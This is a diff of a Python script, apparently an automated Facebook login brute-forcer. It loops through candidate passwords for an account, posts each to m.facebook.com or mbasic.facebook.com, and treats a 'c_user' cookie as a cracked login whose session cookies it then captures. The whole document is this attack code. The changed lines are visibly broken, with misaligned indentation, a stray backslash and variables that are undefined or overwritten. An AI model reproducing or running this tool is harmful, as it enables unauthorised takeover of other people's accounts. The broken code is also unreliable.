@@ -1224,17 +1224,17 @@ def m6(idf,pwv):
  sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M6{P}] ({B}%s{P}){U}+{H}OK{P}(%s{P})'%(loop,ok)),
  try:
   for ps in pwv:
-   session = requests.Session()
-   pro = random.choice(ugen)
-   free_fb = session.get('https://m.facebook.com').text
-   log_data ={'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
-            'email': idf,
-            'login_source': 'comet_headerless_login',
-            'next': 'https://m.facebook.com/login/device-based/regular/login',
-            'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),ps,)} 
-   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data).text
-   log_cookies=session.cookies.get_dict().keys()
+  email = idf
+  password = ps
+  session = requests.session()  
+  session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'}) \
+  r = session.get('https://mbasic.facebook.com')
+  r_login = session.post('https://mbasic.facebook.com/login.php',
+                       data={'email': email,
+                             'pass': password
+                             },
+                       allow_redirects=False)   
+  r_login =session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
